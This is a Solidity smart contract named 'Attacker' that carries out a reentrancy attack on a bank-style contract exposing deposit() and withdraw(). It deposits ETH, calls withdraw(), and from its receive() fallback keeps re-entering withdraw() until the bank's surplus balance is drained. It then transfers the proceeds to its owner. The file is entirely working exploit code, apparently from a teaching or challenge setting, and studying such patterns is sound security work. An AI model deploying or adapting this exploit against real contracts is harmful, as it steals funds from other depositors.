// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IBank {
    function deposit() external payable;

    function withdraw() external;
}

contract Attacker is Ownable {
    IBank public immutable bank;
    uint256 public dep;

    constructor(address _bank) {
        bank = IBank(_bank);
    }

    function attack() external payable {
        // Deposit
        dep = msg.value;
        bank.deposit{value: msg.value}();
        // Withdraw
        bank.withdraw();
    }

    // Receive
    receive() external payable {
        if (address(bank).balance > dep) {
            bank.withdraw();
        } else {
            payable(owner()).transfer(address(this).balance);
        }
    }
}
